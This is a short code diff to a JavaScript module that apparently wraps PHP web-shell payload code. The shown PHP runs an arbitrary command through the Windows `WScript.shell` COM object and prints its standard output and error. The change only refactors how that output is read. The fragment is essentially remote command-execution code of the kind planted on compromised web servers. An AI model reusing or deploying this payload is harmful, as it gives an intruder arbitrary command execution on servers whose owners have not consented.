@@ -76,8 +76,10 @@ module.exports = (arg1, arg2) => ({
         }elseif(substr($d,0,1)!="/" && @class_exists("COM")){
           $w=new COM('WScript.shell');
           $e=$w->exec($c);
-          $ret=$e->StdOut()->ReadAll();
-          $ret.=$e->StdErr()->ReadAll();
+          $so=$e->StdOut();
+          $ret.=$so->ReadAll();
+          $se=$e->StdErr();
+          $ret.=$se->ReadAll();
           print($ret);
         }else{
           $ret = 127;
